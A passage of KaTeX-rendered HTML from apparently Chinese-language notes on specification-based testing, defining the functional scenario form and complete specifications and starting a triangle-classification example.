style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 被称为操作 S 的功能场景形式（functional scenario form FSF）</li><li>将 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>i</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_{pre} \wedge G_i \wedge D_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 视为一个功能场景，因为其定义了一个独特的功能：当初始状态满足 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_{pre} \wedge G_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> (或者直观的说，输入满足时)，最终状态有 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">D_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 定义。 将定义条件与 pre-条件和守卫条件的合取分开，将便于我们基于这个合取生成测试数据，并基于合取和定义条件形成测试oracle。</li></ul><h5 id="definition-2%3Acomplete-specification" tabindex="-1">Definition 2:complete specification</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>2</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>n</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S_{pre} \wedge G_1 \wedge D_1) \vee (S_{pre} \wedge G_2 \wedge D_2) \vee ... \vee (S_{pre} \wedge G_n \wedge D_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>，则 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 完备当且仅当 $G1 \vee G2 \vee … \vee Gn \Leftrightarrow true $恒成立</li><li>注意，这里对操作规范的完全性定义可能与传统理解不同，传统理解要求规范定义用户的所有需求。相反，我们的定义要求任何满足前条件的输入必须满足其中一个守卫条件（例如，G1），从而保证只要所有的定义条件都是可满足的，操作的输出就可以由相应的定义条件（例如，D1）定义。正如我们将在后续的第4.5节中讨论的，规范的完全性影响了我们测试方法的有效性。</li></ul><h5 id="example-1%3A-check-triangle" tabindex="-1">Example 1: Check Triangle</h5><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>e</mi><mi>c</mi><msub><mi>k</mi><mi>T</mi></msub><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><msub><mi>e</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub><mo>=</mo><mo stretchy="false">{</mo><mi>d</mi><mn>1</mn><mo separator="true">,</mo><mi>d</mi><mn>2</mn><mo separator="true">,</mo><mi>d</mi><mn>3</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Check_Triangle_{iv}=\{d1,d2,d3\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ec</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span><span class="mclose">}</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>e</mi><mi>c</mi><msub><mi>k</mi><mi>T</mi></msub><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><msub><mi>e</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub><mo>=</mo><mo stretchy="false">{</mo><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Check_Triangle_{ov}=\{t_{type}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ec</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>e</mi><mi>c</mi><msub><mi>k</mi><mi>T</mi></msub><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><msub><mi>e</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>=</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Check_Triangle_{pre}=true</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ec</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>e</mi><mi>c</mi><msub><mi>k</mi><mi>T</mi></msub><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><msub><mi>e</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mn>1</mn><mo>=</mo><mi>d</mi><mn>2</mn><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><mi>d</mi><mn>2</mn><mo>=</mo><mi>d</mi><mn>3</mn><mtext>  </mtext><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>e</mi><mi>q</mi><mi>u</mi><mi>i</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>a</mi><mi>l</mi><mtext>  